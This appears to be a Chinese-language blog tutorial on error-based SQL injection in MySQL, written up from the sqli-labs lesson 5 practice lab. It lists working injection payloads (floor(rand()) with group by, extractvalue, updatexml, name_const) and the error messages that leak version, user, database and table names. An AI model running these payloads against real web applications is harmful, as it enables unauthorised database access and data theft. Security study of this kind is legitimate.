---
title: 基于报错的盲注
toc: true
description: 本文通过 sqli-lib lesson 5 来总结归纳基于报错的盲注。
summary: 本文通过 sqli-lib lesson 5 来总结归纳基于报错的盲注。
categories:
    - websec
    - sql injection
date: 2019-07-27 15:44:25
tags:
---

# 基于报错的盲注简介

利用的是 SQL 语句报错从而回显出我们想要的信息。首先我们需要找到一句能够报错的 SQL 语句（即：在 mysql 数据库 cmd 命令行中执行就会报错的语句，比如：double、BigInt 溢出，重复，还有由于 mysql 设计缺陷造成自身的 bug 等）

报错语句各式各样，千奇百怪，你可以自己去找、去发现。当然，也有大神们给我们留下来的一些财富。感觉这一部分说难也难，说简单也简单。难是因为那些报错有时并不好找，甚至大神们找的报错的原理咱也搞不懂，简单是因为可以直接用大神找的可以报错的语句，有的报错原理不懂就不懂了，不影响咱们报错盲注。

下面附上几个链接，供基于报错的盲注使用：

[MYSQL 注入天书之盲注讲解](https://www.cnblogs.com/lcamry/p/5763129.html)

[大神对一种报错方式原理的探究](https://blog.csdn.net/qq_35544379/article/details/77453019)

典型的报错注入语句去上面链接找就行了。

# 已知的报错注入方式

下面只列出几种自己使用 sqli-lib less 5 复现成功的报错注入方式

## mysql Bug 865 rand()和 group by 同时使用

```php
?id=1' union select 1,count(*),concat(0x23,(要查询的语句),0x23,floor(rand(0)*2))a from information_schema.columns group by a --+
```

0x23 为 # 对应 ASCII 码的 16 进制，用来隔离突出你查询的内容，便于你找到. 可以自己去 ASCII 码表找其他的字符更换，建议使用 16 进制，直接使用字符，可能有时候会被过滤掉。

后面那个 from information_schema.columns 从哪个表查没啥意思，主要是需要只用 group by 让其和 rand() 函数一起这样才能报错。

**我们只需要将我们的子查询语句写在上面 “要查询的语句” 的位置即可。**

返回值不能超过 1 行数据，所以如果里面的 select 获取的是多行数据时要加 limit，经测试我们要写子查询中不能含有 count(), group_concat 语句，即：不能计数 和 只能 limit 0,1 一条一条来了。

举例：

查询所有表明

```php
?id=1' union select 1,count(*),concat(0x23,(select schema_name from information_schema.schemata limit 0,1),0x23,floor(rand(0)*2))a from information_schema.tables group by a --+
```

回显：Duplicate entry '#information_schema#1' for key 'group_key'

然后改成 limit 1,1、limit 2,1 等慢慢测试。

## double 类型溢出报错

暂无成功复现的

## BIGINT 溢出报错

暂无成功复现的

## 利用 xpath 函数

MySQL 5.1.5 版本中添加了对 XML 文档进行查询和修改的函数，分别是 extractvalue()和 updatexml()

经测试 mysql 8.0.12 仍存在这两个报错，这两个报错函数，除了后者多一个参数外，很多特征都是相似的，下面的测试，一般来说，对这两个函数都是适用的。

返回值不能超过 1 行数据，所以如果里面的 select 获取的是多行数据时要加 limit，可使用 group_concat 函数。

### extractvalue 报错

函数解释：
　　 extractvalue()：从目标 XML 中返回包含所查询值的字符串。
　　 EXTRACTVALUE (XML_document, XPath_string);
　　第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称
　　第二个参数：XPath_string (Xpath 格式的字符串)

我们通过控制第二个参数进行报错注入，xml 文档中查找字符位置时，应为/xxx/xxx/xxx 这种格式，当第二个参数格式不正确时，就会产生 Xpath 语法错误，并返回我们输入的错误语句的内容。

```php
?id=1' and extractvalue(1,concat(0x7e,(要查询的语句),0x73)) --+
```

0x7e 同样也是用来区分你的查询结果，改成 0x23，即：#也行，但是不要输入英文字符的十六进制，建议 concat 的第一个不要用来查数据，写个字符分开就好。总之，具体自己测试。

concat 可以再多连接我们 select 查询的信息，也可以使用 concat_ws

```php
?id=1' and extractvalue(1,concat_ws(0x23,0x23,(select version()),(select database()))) --+
```

注意：报错回显有字符限制，测试为 32 个字符。

比如：

```php
?id=1' and extractvalue(1,concat_ws(', ',0x23,(select version()),(select database()),(select user()),(select @@datadir))) --+
```

回显

> XPATH syntax error: '#, 5.5.53, security, root@localh'

### updatexml 报错

UPDATEXML (XML_document, XPath_string, new_value);

第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称
第二个参数：XPath_string (Xpath 格式的字符串)
第三个参数：new_value，String 格式，替换查找到的符合条件的数据

报错原理同 extractvalue() 第二个参数路径格式问题。

```php
?id=1' and updatexml(1,concat(0x7e,(你要查询的语句)),1)--+
```

当然，这里的 concat 也可以连接好多个，比如：

```php
?id=1' and updatexml(1,concat(0x7e,(select version()),0x7e,(select database())),1)--+
```

由于有字符个数限制，一般我使用的有下面两种语句，

1. 通过改变 limit 的第一个参数来一条记录查（而不使用 group_concat 将所有连接成一个字符串）

    ```
    ?id=1' and extractvalue(1,concat_ws(0x23,0x23,(select schema_name from information_schema.schemata limit 0,1))) --+
    ```

    回显：

    > XPATH syntax error: '##information_schema,challenges,'

2. 如果比较少，比如查出库/表的个数比较少之后，可以先试试 group_concat 没准表名很多，全显示出来了。当然，group_concat 里面也有 order by 看着来吧。

    比如这里查出表的个数为 4 个

    ```php
    ?id=1' and extractvalue(1,concat_ws(0x23,0x23,(select count(table_name) from information_schema.tables where table_schema=database()))) --+
    ```

    下面先用 group_concat 查一下看看。

    ```php
    ?id=1' and extractvalue(1,concat_ws(0x23,0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1))) --+
    ```

    回显

    > XPATH syntax error: '##emails,referers,uagents,users'

    像这样表名都比较短的话，就都查出来了，具体根据实际情况使用吧。

## mysql 重复特性

```php
?id=1' union select 1,2 from (select name_const(version(),1),name_const(version(),1))x --+
```

前后两个 nameconst 的内容要一样。只能用来查询数据库版本，我测试过 database(),user() 等均未成功。

# 补：limit 函数简介

limit 函数的使用有点忘记了，再回顾一下。

SELECT column1, column2 FROM tbl_name LIMIT offset , count;

1. limit 可以有两个参数，第一个参数是开始位置的偏移，从 0 开始，第二个参数是最多显示的记录条数。

2. limit 也可以有一个参数的简写形式： limit n; 相当于 limit 0,n; 从第一条开始，最多显示 n 条

3. SELECT \* FROM products LIMIT 8 OFFSET 0; (在 mysql 5 以后支持这种写法) ，这个指偏移为：0 位置，即开始位置，最多 8 条数据。和第一种参数顺序相反，与第一种功能相同。

# 总结回顾

1. 目前来看，报错注入最佳的语句便是 XPATH 的两个函数（鉴于第二个函数多一个参数），最好的语句便是 XPATH 的 extractvalue 语句了。
